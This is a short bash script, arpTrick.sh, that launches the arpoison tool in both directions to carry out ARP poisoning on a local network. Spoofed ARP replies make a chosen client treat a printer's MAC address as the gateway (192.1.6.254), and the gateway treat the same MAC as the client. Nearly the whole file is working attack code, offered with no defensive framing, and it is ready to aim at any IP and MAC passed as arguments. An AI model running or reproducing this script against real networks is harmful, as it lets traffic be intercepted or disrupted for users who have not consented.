#!/bin/bash - 
#===============================================================================
#
#          FILE: arpTrick.sh
# 
#         USAGE: ./arpTrick.sh IP MAC
# 
#   DESCRIPTION: arpoison the client. let the client believes the printer 
#                   is the gateway(192.1.6.254).
# 
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: kk (Kingkong Mok), kingkongmok AT gmail DOT com
#  ORGANIZATION: 
#       CREATED: 08/06/2013 10:50:32 AM CST
#      REVISION:  ---
#===============================================================================

set -o nounset                              # Treat unset variables as an error
set -x

function usage () {
    echo "usage: `basename $0` IP_ToPoison MAC_ToPoison"
}
if [ "$#" != 2 ] ; then
    usage; exit 23;
fi

IP=$1;
MAC=$2;
ARPOISON=/usr/sbin/arpoison;

sudo $ARPOISON -i enp0s25 -d $IP -s 192.1.6.254 -t $MAC -r 00:1B:78:EA:62:A9 -w 5  > /dev/null &
sudo $ARPOISON -i enp0s25 -d 192.1.6.254 -s $IP -t 3C:E5:A6:D6:1D:61 -r 00:1B:78:EA:62:A9 -w 5 > /dev/null &

echo 'Waiting for a key press to cancel...'
read -n1 -s

sudo pkill arpoison

